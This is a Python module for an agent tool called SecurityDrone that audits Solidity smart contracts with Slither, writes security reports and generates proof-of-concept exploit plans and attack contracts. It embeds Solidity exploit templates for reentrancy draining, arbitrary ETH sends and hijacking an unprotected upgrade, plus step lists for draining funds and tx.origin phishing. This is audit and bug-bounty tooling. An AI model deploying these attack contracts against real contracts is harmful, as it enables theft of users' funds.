from typing import Any, Dict, List
from .base_drone import BaseDrone


class SecurityDrone(BaseDrone):
    """Security Drone: Specialized in smart contract security analysis and exploit generation. Can analyze Solidity contracts for vulnerabilities using Slither, generate detailed security reports, create Proof-of-Concept (PoC) exploit plans, and write Solidity attacking contracts. Essential for bug bounty hunting and security research."""

    def __init__(self):
        super().__init__("SecurityDrone")

    def get_supported_actions(self) -> Dict[str, Dict[str, Any]]:
        return {
            "analyze_contract": {
                "description": "Analyzes a given Solidity contract code snippet for vulnerabilities.",
                "parameters": [
                    {"name": "contract_code", "type": "str", "description": "The Solidity contract code to analyze."},
                    {"name": "contract_name", "type": "str", "optional": True, "description": "The name of the main contract within the code. Defaults to 'Contract'."}
                ]
            },
            "analyze_contract_file": {
                "description": "Analyzes a Solidity contract file for vulnerabilities using Slither.",
                "parameters": [
                    {"name": "file_path", "type": "str", "description": "The path to the Solidity contract file."},
                    {"name": "contract_name", "type": "str", "optional": True, "description": "The name of the main contract in the file. If not provided, Slither will attempt to deduce it."}
                ]
            },
            "generate_security_report": {
                "description": "Generates a formatted security report from a list of identified vulnerabilities.",
                "parameters": [
                    {"name": "vulnerabilities", "type": "List[Dict[str, Any]]", "description": "A list of vulnerability dictionaries, typically from a Slither analysis."},
                    {"name": "format", "type": "str", "optional": True, "description": "The desired format for the report (e.g., 'markdown', 'json'). Defaults to 'markdown'."}
                ]
            },
            "generate_poc_plan": {
                "description": "Generates a Proof-of-Concept (PoC) exploitation plan for a given vulnerability.",
                "parameters": [
                    {"name": "vulnerability", "type": "Dict[str, Any]", "description": "A dictionary representing the vulnerability for which to create a PoC plan."}
                ]
            },
            "write_poc_exploit": {
                "description": "Writes a Solidity Proof-of-Concept (PoC) attacking contract for a specific vulnerability to a file.",
                "parameters": [
                    {"name": "vulnerability", "type": "Dict[str, Any]", "description": "A dictionary representing the vulnerability."},
                    {"name": "output_file", "type": "str", "description": "The filename to save the generated PoC Solidity contract."},
                    {"name": "target_contract", "type": "str", "optional": True, "description": "The name of the vulnerable contract the PoC will target. Defaults to 'VulnerableContract'."}
                ]
            },
            "full_security_audit": {
                "description": "Performs a complete security audit on a Solidity contract file, including analysis, report generation, and optional PoC generation.",
                "parameters": [
                    {"name": "file_path", "type": "str", "description": "The path to the Solidity contract file to audit."},
                    {"name": "generate_report", "type": "bool", "optional": True, "description": "Whether to generate a security report. Defaults to True."},
                    {"name": "report_output", "type": "str", "optional": True, "description": "Filename for the security report. Defaults to 'security_report.md'."},
                    {"name": "generate_poc", "type": "bool", "optional": True, "description": "Whether to generate a PoC exploit for critical vulnerabilities. Defaults to False."},
                    {"name": "poc_output", "type": "str", "optional": True, "description": "Filename for the PoC exploit contract. Defaults to 'exploit_poc.sol'."}
                ]
            }
        }

    def execute(self, action: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        if action == "analyze_contract":
            return self._analyze_contract(parameters)
        elif action == "analyze_contract_file":
            return self._analyze_contract_file(parameters)
        elif action == "generate_security_report":
            return self._generate_security_report(parameters)
        elif action == "generate_poc_plan":
            return self._generate_poc_plan(parameters)
        elif action == "write_poc_exploit":
            return self._write_poc_exploit(parameters)
        elif action == "full_security_audit":
            return self._full_security_audit(parameters)
        else:
            return self._error_response(f"Unknown action: {action}")

    def _analyze_contract(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["contract_code"])
        if error:
            return self._error_response(error)

        security_tool = self.tools.get("security_analyzer")
        if not security_tool:
            return self._error_response("SecurityAnalyzerTool not registered")

        contract_code = parameters["contract_code"]
        contract_name = parameters.get("contract_name", "Contract")

        result = security_tool.execute(
            "analyze_contract", contract_code=contract_code, contract_name=contract_name
        )

        if result["success"]:
            data = result["data"]
            return self._success_response(
                data, f"Analysis complete: {data['total_issues']} vulnerabilities found"
            )
        else:
            return result

    def _analyze_contract_file(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["file_path"])
        if error:
            return self._error_response(error)

        security_tool = self.tools.get("security_analyzer")
        if not security_tool:
            return self._error_response("SecurityAnalyzerTool not registered")

        file_path = parameters["file_path"]
        contract_name = parameters.get("contract_name")

        result = security_tool.execute(
            "analyze_file", file_path=file_path, contract_name=contract_name
        )

        if result["success"]:
            data = result["data"]
            severity_summary = ", ".join(
                [f"{k}: {v}" for k, v in data["severity_counts"].items() if v > 0]
            )
            return self._success_response(
                data,
                f"Analyzed {file_path}: {data['total_issues']} issues ({severity_summary})",
            )
        else:
            return result

    def _generate_security_report(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["vulnerabilities"])
        if error:
            return self._error_response(error)

        security_tool = self.tools.get("security_analyzer")
        if not security_tool:
            return self._error_response("SecurityAnalyzerTool not registered")

        vulnerabilities = parameters["vulnerabilities"]
        report_format = parameters.get("format", "markdown")

        result = security_tool.execute(
            "get_vulnerability_report",
            vulnerabilities=vulnerabilities,
            format=report_format,
        )

        if result["success"]:
            return self._success_response(
                result["data"], f"Generated {report_format} security report"
            )
        else:
            return result

    def _generate_poc_plan(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["vulnerability"])
        if error:
            return self._error_response(error)

        vulnerability = parameters["vulnerability"]

        poc_plan = self._create_poc_plan(vulnerability)

        return self._success_response(
            poc_plan,
            f"Generated PoC plan for {vulnerability.get('check', 'vulnerability')}",
        )

    def _write_poc_exploit(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["vulnerability", "output_file"])
        if error:
            return self._error_response(error)

        fs_tool = self.tools.get("file_system")
        if not fs_tool:
            return self._error_response("FileSystemTool not registered")

        vulnerability = parameters["vulnerability"]
        output_file = parameters["output_file"]
        target_contract = parameters.get("target_contract", "VulnerableContract")

        poc_code = self._generate_poc_solidity_code(vulnerability, target_contract)

        write_result = fs_tool.execute("write", file_path=output_file, content=poc_code)

        if write_result["success"]:
            return self._success_response(
                {
                    "file_path": output_file,
                    "vulnerability_type": vulnerability.get("check", "unknown"),
                    "code": poc_code,
                },
                f"PoC exploit written to {output_file}",
            )
        else:
            return write_result

    def _full_security_audit(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        error = self._validate_parameters(parameters, ["file_path"])
        if error:
            return self._error_response(error)

        file_path = parameters["file_path"]
        generate_report = parameters.get("generate_report", True)
        report_output = parameters.get("report_output", "security_report.md")
        generate_poc = parameters.get("generate_poc", False)
        poc_output = parameters.get("poc_output", "exploit_poc.sol")

        analysis_result = self._analyze_contract_file({"file_path": file_path})

        if not analysis_result["success"]:
            return analysis_result

        vulnerabilities = analysis_result["data"]["vulnerabilities"]
        audit_data = {
            "file_path": file_path,
            "analysis": analysis_result["data"],
            "report_generated": False,
            "poc_generated": False,
        }

        if generate_report and vulnerabilities:
            report_result = self._generate_security_report(
                {"vulnerabilities": vulnerabilities, "format": "markdown"}
            )

            if report_result["success"]:
                fs_tool = self.tools.get("file_system")
                if fs_tool:
                    report_content = report_result["data"]["report"]
                    fs_tool.execute(
                        "write", file_path=report_output, content=report_content
                    )
                    audit_data["report_generated"] = True
                    audit_data["report_file"] = report_output

        if generate_poc and vulnerabilities:
            critical_vulns = [
                v for v in vulnerabilities if v.get("impact") in ["High", "Medium"]
            ]

            if critical_vulns:
                poc_result = self._write_poc_exploit(
                    {"vulnerability": critical_vulns[0], "output_file": poc_output}
                )

                if poc_result["success"]:
                    audit_data["poc_generated"] = True
                    audit_data["poc_file"] = poc_output
                    audit_data["poc_vulnerability"] = critical_vulns[0]["check"]

        return self._success_response(
            audit_data, f"Security audit complete: {len(vulnerabilities)} issues found"
        )

    def _create_poc_plan(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        vuln_type = vulnerability.get("check", "unknown")
        impact = vulnerability.get("impact", "Unknown")
        description = vulnerability.get("description", "No description")

        plan = {
            "vulnerability_type": vuln_type,
            "impact": impact,
            "description": description,
            "exploitation_steps": self._get_exploitation_steps(vuln_type),
            "prerequisites": self._get_prerequisites(vuln_type),
            "expected_outcome": self._get_expected_outcome(vuln_type),
        }

        return plan

    def _get_exploitation_steps(self, vuln_type: str) -> List[str]:
        steps_map = {
            "reentrancy-eth": [
                "Deploy attacking contract with fallback function",
                "Call vulnerable function to trigger initial withdrawal",
                "In fallback, recursively call vulnerable function before state update",
                "Drain contract funds through repeated calls",
            ],
            "arbitrary-send-eth": [
                "Identify function that sends ETH to arbitrary address",
                "Call function with attacker-controlled address",
                "Receive unauthorized ETH transfer",
            ],
            "unprotected-upgrade": [
                "Identify unprotected upgrade function",
                "Call upgrade function to replace implementation",
                "Deploy malicious implementation contract",
            ],
            "tx-origin": [
                "Deploy phishing contract",
                "Trick authorized user to call phishing contract",
                "Phishing contract calls vulnerable contract using tx.origin check",
            ],
        }

        return steps_map.get(
            vuln_type,
            [
                "Analyze vulnerability details",
                "Identify attack vector",
                "Craft exploit transaction",
                "Execute exploit",
            ],
        )

    def _get_prerequisites(self, vuln_type: str) -> List[str]:
        prereq_map = {
            "reentrancy-eth": [
                "Contract must have ETH balance",
                "Attacker needs initial ETH for transaction",
            ],
            "arbitrary-send-eth": [
                "Contract must have ETH balance",
                "Function must be callable by attacker",
            ],
            "unprotected-upgrade": ["Upgrade function must be accessible"],
        }

        return prereq_map.get(vuln_type, ["Access to vulnerable contract"])

    def _get_expected_outcome(self, vuln_type: str) -> str:
        outcome_map = {
            "reentrancy-eth": "Complete drainage of contract's ETH balance",
            "arbitrary-send-eth": "Unauthorized ETH withdrawal to attacker address",
            "unprotected-upgrade": "Full control over contract logic",
            "tx-origin": "Bypass authentication checks",
        }

        return outcome_map.get(vuln_type, "Successful exploitation of vulnerability")

    def _generate_poc_solidity_code(
        self, vulnerability: Dict[str, Any], target_contract: str
    ) -> str:
        vuln_type = vulnerability.get("check", "unknown")

        if "reentrancy" in vuln_type.lower():
            return self._generate_reentrancy_poc(target_contract)
        elif "arbitrary-send" in vuln_type.lower():
            return self._generate_arbitrary_send_poc(target_contract)
        elif "unprotected-upgrade" in vuln_type.lower():
            return self._generate_upgrade_poc(target_contract)
        else:
            return self._generate_generic_poc(target_contract, vuln_type)

    def _generate_reentrancy_poc(self, target_contract: str) -> str:
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I{target_contract} {{
    function withdraw() external;
    function deposit() external payable;
}}

contract ReentrancyAttack {{
    I{target_contract} public target;
    uint256 public attackCount;
    uint256 public maxAttacks = 10;
    
    constructor(address _target) {{
        target = I{target_contract}(_target);
    }}
    
    function attack() external payable {{
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        target.deposit{{value: msg.value}}();
        target.withdraw();
    }}
    
    receive() external payable {{
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {{
            attackCount++;
            target.withdraw();
        }}
    }}
    
    function collectStolenFunds() external {{
        payable(msg.sender).transfer(address(this).balance);
    }}
}}
"""

    def _generate_arbitrary_send_poc(self, target_contract: str) -> str:
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I{target_contract} {{
    function sendEth(address recipient, uint256 amount) external;
}}

contract ArbitrarySendAttack {{
    I{target_contract} public target;
    
    constructor(address _target) {{
        target = I{target_contract}(_target);
    }}
    
    function attack(uint256 amount) external {{
        target.sendEth(msg.sender, amount);
    }}
}}
"""

    def _generate_upgrade_poc(self, target_contract: str) -> str:
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface I{target_contract} {{
    function upgradeTo(address newImplementation) external;
}}

contract MaliciousImplementation {{
    function drain() external {{
        payable(msg.sender).transfer(address(this).balance);
    }}
}}

contract UnprotectedUpgradeAttack {{
    I{target_contract} public target;
    
    constructor(address _target) {{
        target = I{target_contract}(_target);
    }}
    
    function attack() external {{
        MaliciousImplementation malicious = new MaliciousImplementation();
        target.upgradeTo(address(malicious));
    }}
}}
"""

    def _generate_generic_poc(self, target_contract: str, vuln_type: str) -> str:
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PoC Exploit for vulnerability: {vuln_type}
// Target contract: {target_contract}

interface I{target_contract} {{
    // Add target contract interface functions here
}}

contract Exploit {{
    I{target_contract} public target;
    
    constructor(address _target) {{
        target = I{target_contract}(_target);
    }}
    
    function exploit() external {{
        // Implement exploitation logic based on vulnerability type
        // Vulnerability: {vuln_type}
    }}
}}
"""
